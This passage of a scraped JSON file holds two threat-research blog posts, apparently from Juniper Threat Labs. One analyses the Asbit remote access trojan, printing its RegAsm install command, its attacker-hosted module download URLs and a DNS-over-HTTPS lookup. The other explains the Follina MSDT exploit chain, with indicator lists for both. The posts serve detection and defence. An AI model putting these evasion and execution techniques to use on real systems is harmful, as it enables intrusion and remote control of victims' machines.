                "text": "Introduction Juniper Threat Labs is currently monitoring an emerging Chinese Remote Desktop Trojan called Asbit. It’s a remote access Trojan being advertised on its developer’s website as a “Fast Remote Desktop”. This RAT first made its appearance in 2021 and kept updating its infrastructure and features as it went along. It uses a number of strategies to avoid endpoint and network detection. By using DNS over HTTPS (DoH) to resolve the IP addresses of its control servers, it aims to get past network DNS filters. The domain asbit[.]cn was registered on January 31, 2021. This domain was used to host the malware and its modules. It also hosts the threat actor’s website. The website is still live at the time of this publication. Recently, the threat actor registered another domain and website, rdlite[.]com . The new website looks like a copy of the previous website. The website www.asbit.cn translated to English. It advertises itself as “Fast Desktop”, a secure remote desktop application for IT professionals. Timeline To provide an understanding of the Asbit operation, below is a timeline of their infrastructure. The domain, asbit[.]cn was registered on January 31, 2021. At that time, it resolved to IP 47.111.81.199 .  Later in the year 2021, the threat actors registered mitm[.]work and fmt[.]ink . At this time, the servers are hosted on Linux servers. In 2022, they registered the domain def[.]cab, rfb[.]ink and rdlite[.]com . Around June of 2022, we also see a shift of the OS they used in hosting these servers. Based on third-party server fingerprinting services like Shodan and Cencys, we found that they shifted to Windows OS and used IIS. It’s unclear to us why they shifted to Windows. Domain Creation Date DNS Resolution ASN Country First Seen Last Seen OS asbit.cn January 31, 2021 47.111.81.199 Hangzhou Alibaba Advertising Co.,Ltd. China 2021-01-31 14:12:49 2021-10-22 5:50:25 Linux 43.128.31.158 Asia Pacific Network Information Center, Pty. Ltd. Hong Kong 2021-10-23 0:35:40 2021-12-21 0:35:50 Linux 43.156.37.105 Tencent Cloud Computing (Beijing) Co., Ltd China 2021-12-22 15:42:42 2021-12-22 15:42:42 Linux mitm.work May 24, 2021 43.128.31.158 Asia Pacific Network Information Center, Pty. Ltd. China 2021-06-04 18:11:34 2021-12-15 8:34:51 Linux 43.154.232.199 Tencent Cloud Computing (Beijing) Co., Ltd China 2022-06-15 5:41:34 2022-07-12 4:04:09 Windows, IIS server 119.28.78.209 Tencent cloud computing (Beijing) Co., Ltd. Hong Kong 2022-07-12 4:30:38 2022-08-01 0:33:24 Windows, IIS server fmt.ink September 4, 2021 43.128.31.158 Asia Pacific Network Information Center, Pty. Ltd. Hong Kong 2021-09-06 2:23:53 2022-05-20 8:39:50 Linux 43.154.211.60 Tencent Cloud Computing (Beijing) Co., Ltd China 2022-05-20 9:07:51 2022-06-19 17:40:10 Unknown 43.154.232.199 Tencent Cloud Computing (Beijing) Co., Ltd China 2022-06-15 5:20:32 2022-07-12 4:27:52 Windows, IIS server 119.28.78.209 Tencent cloud computing (Beijing) Co., Ltd. Hong Kong 2022-07-12 5:10:32 2022-08-01 1:56:23 Windows, IIS server def.cab May 6, 2022 43.128.31.158 Asia Pacific Network Information Center, Pty. Ltd. China 2022-05-08 23:00:04 2022-05-08 23:00:04 Linux 43.154.232.199 Tencent Cloud Computing (Beijing) Co., Ltd China 2022-07-12 9:55:52 2022-07-26 21:07:26 Windows, IIS server rfb.ink February 24, 2022 43.128.31.158 Asia Pacific Network Information Center, Pty. Ltd. Hong Kong 2022-05-14 13:07:32 2022-05-18 7:20:44 Linux 43.154.211.60 Tencent Cloud Computing (Beijing) Co., Ltd China 2022-05-21 15:34:34 2022-06-03 2:41:55 Unknown 43.154.232.199 Tencent Cloud Computing (Beijing) Co., Ltd China 2022-06-03 15:32:50 2022-07-12 8:58:52 Windows, IIS server 119.28.78.209 Tencent cloud computing (Beijing) Co., Ltd. Hong Kong 2022-07-12 9:50:46 2022-07-25 11:51:59 Windows, IIS server rdlite.com June 8, 2022 104.21.10.90 Cloudflare United States 2022-06-08 17:26:55 2022-08-10 2:16:40 Unknown 172.67.162.192 Cloudflare United States 2022-06-08 17:26:55 2022-08-10 2:16:40 Unknown Early Version of asbit RAT The earliest version of the malware we could find dates back to May 2021. It included a series of loader modules which will eventually download the core module. The malware is typically bundled with installers. It starts by dropping the loader module that installs another DLL as a service. The installed service further downloads and executes the core module. The core module has remote desktop functionality and other capabilities, including command execution and keystroke injection. The malicious installer ( 806523a9e4021cd72691fbdeb229339a24984b7ca79c3860ba468c832bf95c4d ) drops the loader modules C:\\2.0.50727 and C:\\4.0.30319 . The files appear to be folders of the .NET framework, but they are in fact files. This is likely done by the author to obscure itself and try to evade endpoint detection. It also drops a malicious libexpat.dll ( 018656e61c7c5fc8d5983a32507fbcf379dd9e2b5dd7d67b8e44590d46a8c51f ) and a benign XLSP.dll ( cca2ea493c8402ed24c9c93328066ae0ce451059e2f954929f24ab7481119b6c ). The installer drops the components in the C:\\ directory. Loader Module The loader module starts with the dropped C:\\2.0.50727 or C:\\4.0.30319. It executes either of these files using RegAsm.exe , an assembly registration tool that is used to load .NET assembly files. C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\RegAsm.exe /u \"C:\\4.0.30319\" The \"/u\" parameter, which means \"Unregister “, is part of the command to install this module. This could be interpreted as being used to remove the module. However, the module itself has an “Unregister” function that does the opposite. It creates a service for libexpat.dll that further downloads additional modules, including the core module. Unregister function in the loader module that installs 2 DLLs as a service. Once the libexpat.dll service is installed and running, it downloads 2 additional modules. One is a module that creates a web proxy ( f223ceb9830ed18d823f42d9d8d5c09429782e0bcdbc62da5f00c881964e7041 ) and the other is the core module ( 4b1efadc55c0cc3471e0945804125317b2a75772393541f680b1617f8a42773d ). Second Loader Module This module installs a browser proxy by downloading a Proxy Auto-Configuration (PAC) file from 47.111.81.199 . This allows the threat actor to act as a Browser-in-the-Middle by making all requests from the browser proxied to the threat actor’s server. Installation of the PAC file also includes installation of the threat actor’s certificate. Function that download and install a PAC file The certificate installed by asbit malware. Lastly, the module contacts “rat.t.com” to report the newly infected system. The system information which includes MAC address, OS, CPU and date is hashed and sent as the ID. Core Module The core module is a fully functional RAT. It has a hard coded server to where it connects to, which is 47.111.81.199:6000 . It also includes several functionalities including command execution and keystroke injection. Below are the list of functions it can perform: Capture Screenshots Run TightVNC for Remote Desktop Control Control Mouse Movements Inject Keystrokes Kill Process by PID Download Files Execute Commands Collect Installed Certificates An interesting function of this RAT is that it uses TightVNC for its remote desktop functions. We also found other variants of this malware that use UltraVNC instead of TightVNC. Function in the core module that uses TightVNCServer. WinVNC.exe process seen during execution of the malware. Latest Version As we noted in the “Timeline” section, the threat actor changed its infrastructure. It shifted to the following domains for its download and control servers. ink ink cab work They have also added functionality to bypass network security using DNS over HTTPS (DoH) and added a separate module solely for Remote Desktop using the RDPSession Class built in Windows. Installer We found the installer distributed as .pif files. Some of these files were seen as discord attachments, which indicates how the threat actors used Discord as an infection vector. Below are some of the installer files we found: Filename : Photo_2022-07-10_19-23-19.pif Sha256 : 754cc559a2c861c0ef8acfbbb632e79e04839ab9f8948fa3392c1cd69d14f026 ITW URL : https://cdn.discordapp.com/attachments/911561368359039026/995990526950117406/photo_2022-07-10_19-23-19.pif Filename : Need to download attachments.pif Sha256 : C5a720c2460da4c49b912409b204fbec31c79af3f7aaa011a3e679645f060760 ITW URL : Unknown Filename : WhatsAppSMS reception.txt Sha256 : a2cdf57b6a1cbf36d0440feedb2d9593e81cf646fd6f736a66d32950c1fa6857 ITW URL : Unknown The following analysis is based on the installer 754cc559a2c861c0ef8acfbbb632e79e04839ab9f8948fa3392c1cd69d14f026 . The installer drops the loader module and libexpat.dll . It has a slightly different install command than the first version. It still uses RegAsm.exe to load the loader module but now it drops it in C:\\ with a random filename not with a .NET folder-like name. Libexpat.dll is also dropped in C:\\ProgramData. \"C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\RegAsm.exe\" /u \"C:\\kfdjvzx5.5ie\" dd99e3acca16b02fa947b0742acfdc0a entry The loader module, C:\\kfdjvzx5.5ie installs libexpat.dll as a service. Libexpat.dll further downloads the following additional modules. Core Downloaded from http://106[.]12.129.126/build?project=loader.core&version=4.0.30319 Downloads the core Module Has functions to uninstall itself and the malware Core Module Downloaded from http://106[.]12.129.126/build?project=client.core&version=4.0.30319 as a gzip file Uses DoH to determine the IP of ddns.b.rdlite.com where it can download the rdp module. Rdp Client Module Downloaded from http://222[.]210.157.249:1024/build?project=rdp.client.core&version=4.0.30319&t=28069859 Uses DoH to determine the IP of its control server (v2.team.rfb.ink:5100) Core Module The new core module includes functions such as capture screenshots, inject keystrokes and execute commands, but we noticed a much cleaner programming style hinting active development of the malware. We also noticed it added several functions, particularly handlers, for example, vnc, rfb and p2p functions. Another interesting function is the use of DNS over HTTP (DoH) to query the ip address of its control servers. For instance, the domain name of the file server where it hosts the rdp module could be any of the following domains: a.rdlite.com:1024 b.rdlite.com:1024 w.rdlite.com:1024 However, it does not use the traditional way of getting the IP address, which is connecting to the DNS at port 53 using UDP. Rather, it gets the IP address using DNS over HTTP (DoH). Below is a query for the IP address of ddns.b.rdlite.com using Alibaba DoH server. GET /resolve?name=ddns.b.rdlite.com&short=true&_=28042000 HTTP/1.1 Host: 223.5.5.5 Connection: Keep-Alive [\"222.210.157.249\"] Currently, it can either use AliDns or DnsPod DoH servers. Using DoH makes the malware more resilient against network filters that rely on traditional DNS queries for blocking domains. For example, a network filter that blocks the domain ddns.b.rdlite.com won’t be able to block the request because it can only see the HTTP request to DoH servers (e.g., Alibaba or DnsPod). The way to block this request is to directly block the IP address associated with the domain. It’s interesting to note however that the malware author did not use HTTPS which will make it more resilient as such requests are encrypted. RDP Client Module This module is mainly for remote desktop control as the name implies. The old versions relied on commercial or free remote desktop applications, such as TightVNC or UltraVNC while the latest version implements its own RDP. It does this by using the built-in Windows RDP application. It works by creating an RDP Session instance by using the CLSID ( 9B78F0E6-3E05-4A5B-B2E8-E743A8956B65 ) which is the RDPSession Class in Windows. The RDP modules control server is v2.team.rfb.ink:5100 , and it also uses DoH to determine the IP of its control server. Conclusion In this blog, we have detailed the evolution of an emerging Chinese remote desktop trojan. We have identified some of its capabilities and its infrastructure and how it tries to evade endpoint and network detection. We believe that this RAT is in its early development but it’s actively being developed. It’s likely that we will see future versions of this malware with enhanced capabilities and new ways of evading endpoint and network detection. Juniper ATP Cloud detects this malware using Machine Learning based on behavioral analysis engine. Indicators of Compromise asbit[.]cn mitm[.]work rdlite[.]com fmt[.]ink def[.]cab rfb[.]ink 47[.]111[.]81[.]199 43[.]128[.]31[.]158 43[.]156[.]37[.]105 43[.]154[.]232[.]199 119[.]28[.]78[.]209 43[.]154[.]211[.]60 104[.]21[.]10[.]90 172[.]67[.]162[.]192 806523a9e4021cd72691fbdeb229339a24984b7ca79c3860ba468c832bf95c4d 018656e61c7c5fc8d5983a32507fbcf379dd9e2b5dd7d67b8e44590d46a8c51f f223ceb9830ed18d823f42d9d8d5c09429782e0bcdbc62da5f00c881964e7041 4b1efadc55c0cc3471e0945804125317b2a75772393541f680b1617f8a42773d 754cc559a2c861c0ef8acfbbb632e79e04839ab9f8948fa3392c1cd69d14f026 C5a720c2460da4c49b912409b204fbec31c79af3f7aaa011a3e679645f060760 a2cdf57b6a1cbf36d0440feedb2d9593e81cf646fd6f736a66d32950c1fa6857"
            }
        },
        {
            "https://blogs.juniper.net/en-us/threat-research/cve-2022-30190-microsoft-windows-support-diagnostic-tool-msdt-remote-code-execution-vulnerability": {
                "metadata": {
                    "dateAccessed": "2022-11-15",
                    "dateCreated": "2022-06-08",
                    "source": "blogs.juniper.net"
                },
                "text": "A zero-day vulnerability was discovered on Microsoft Windows Support Diagnostic Tool (MSDT). On May 27, a researcher who goes by the twitter handle nao_sec discovered an interesting Microsoft Word d ocument submitted from Belarus. The document calls out to an external HTML file which uses ms-msdt URL protocol to execute Powershell code. Assigned CVE-2022-30190 , Microsoft recently released an advisory to mitigate the impact of this exploit. How the Exploit Works First, in a Microsoft Word file, an HTML file is referenced externally in “ word\\_ rels \\ document.xml.rels ”. This file is responsible for defining relationships associated with embedded objects in the document. In this case, the relationship being referred to is an OLE object. OLE objects are part of Microsoft’s proprietary Object Linking and Embedding technology, which allows external documents, such as an Excel spreadsheet, to be embedded within a Word document. The external HTML file is a javascript that uses the MSDT URL scheme, “ ms-msdt:/ ” followed by arguments, which include Powershell commands, to be able to execute code. The payload for the following PoC is base64 encoded. The padding is needed because at least 4096 bytes is needed for this exploit to trigger. In the Wild Attacks The following are documents we have seen in-the-wild that exploit this vulnerability. Due to the sensitivity of some of the documents, we have redacted parts of the document contents. 05-2022-0438.doc Sha256: 4a24048f81afbe9fb62e7a6a49adbd1faf41f266b5f9feecdceb567aec096784 This is the file first discovered by naosec that triggered the disclosure of this exploit. The file was first uploaded to VirusTotal on May 27 from an IP address geolocated in Belarus. The doc file references the following html file: https://www[.]xmlformats[.]com/office/word/2022/wordprocessingDrawing/RDF842l.html ! This HTML contains the “ms-msdt:/” URI scheme followed by arguments and a Powershell code. The payload is base64 encoded. The decoded payload is another Powershell script , which kills the process of msdt.exe and extracts 05-2022-0438.rar into rgb.exe Inside RDF842l.html. Highlighted part is the base64 encoded payload Base64 decoded payload We don’t know the nature of rbg.exe as we are unable to get a copy of the R ar file or rgb .exe. Exposing_Sonish_Liar!!!.doc Sha256: D61d70a4d4c417560652542e54486beb37edce014e34a94b8fd0020796ff1ef7 This file was first submitted to VirusTotal on April 8, 2022. It references the following HTML file, “ https://exchange[.] oufca [.]com.au/ owa /auth/15.1.2375/themes/p3azx.html! ” , which leads to “ test.cab ” , which download s a base64 encoded Cobalt Strike BEACON from “ 160.20.145.111 ” . CSAFP’S_GUIDANCE_RE_NATIONAL_AND_LOCAL_ELECTION_2022_NLE.docx Sha256: d118f2c99400e773b8cfd3e08a5bcf6ecaa6a644cb58ef8fd5b8aa6c29af4cf1 This file was uploaded to Virustotal on May 5, 2022. It appears to be a memorandum sent to Philippine Armed Forces regarding securing the National Election. The election was held on May 9, 2022. It references an HTML file from http://141[.]98.215.99/color.html . РЭТ-ЮМ-3044 от 12.04.2022.doc Sha256: fe300467c2714f4962d814a34f8ee631a51e8255b9c07106d44c6a1f1eda7a45 This file was uploaded to VT on April 13, 2022. It references the HTML from “ https://www[.]sputnikradio.net/radio/news/1134.html !”. We are unable to get a copy of the HTML file . VIP Invitation to Doha Expo 2023.rar Sha256: d6be967d250f0be8e212cff9264fd0391a33f2ac00efeb508f7b79fca2fdf989 This file was first submitted to VT on June 1, 2022 , presumably as an email attachment. Inside this Rar file is a document, VIP Invitation to Doha Expo 2023.docx , with sha256sum of 4fdec1c9111132a7f57fabfa83a6b7f73b3012d9100a790deaa53df184c1d4c4 . It references an HTML file from https://files[.]attend-doha-expo[.]com/inv.html . The HTML retrieves a file from SMB share on 5.206.224.233 , maps it into z: drive and executes a file on that share , osupdate .exe . The nature of osupdate.exe is unknown as we are not able to retrieve this file. Juniper Advance Threat Protection (ATP) was able to natively detect this threat without the need for update or signature, using behavioral analysis and machine learning. On-premise ATP detection Cloud ATP detection Indicators of Compromise Hashes 4a24048f81afbe9fb62e7a6a49adbd1faf41f266b5f9feecdceb567aec096784 05-2022-0438.doc d61d70a4d4c417560652542e54486beb37edce014e34a94b8fd0020796ff1ef7 Exposing_Sonish_Liar!!!.doc 61f63946a6f15ce0b7fc5f79f997daf4634003b38cc46ca24ff48154dfe754dd test.cab 80a138b77e2dc37b2165ac74d758e1f9eda34e7661f1479c9c76f9e038927e17 test.exe 5327c76b0a4d034dbc01721e0f9c300d61f0bdfba2f1076e9261e4d41a6afb76 Cobalt Strike fe300467c2714f4962d814a34f8ee631a51e8255b9c07106d44c6a1f1eda7a45 РЭТ-ЮМ-3044 от 12.04.2022.doc d6be967d250f0be8e212cff9264fd0391a33f2ac00efeb508f7b79fca2fdf989 VIP Invitation to Doha Expo 2023.rar 4fdec1c9111132a7f57fabfa83a6b7f73b3012d9100a790deaa53df184c1d4c4 VIP Invitation to Doha Expo 2023.docx d118f2c99400e773b8cfd3e08a5bcf6ecaa6a644cb58ef8fd5b8aa6c29af4cf1 CSAFP’S_GUIDANCE_RE_NATIONAL_AND_LOCAL_ELECTION_2022_NLE.docx URL https://files[.]attend-doha-expo.com/inv.html https://www[.]sputnikradio.net/radio/news/1134.html https://exchange[.]oufca[.]com.au/owa/auth/15.1.2375/themes/p3azx.html https://www[.]xmlformats[.]com/office/word/2022/wordprocessingDrawing/RDF842l.html 5[.]206.224.233 160[.]20.145.111 Reference https://www.huntress.com/blog/microsoft-office-remote-code-execution-follina-msdt-bug https://msrc-blog.microsoft.com/2022/05/30/guidance-for-cve-2022-30190-microsoft-support-diagnostic-tool-vulnerability/"
            }
        }
    ]
}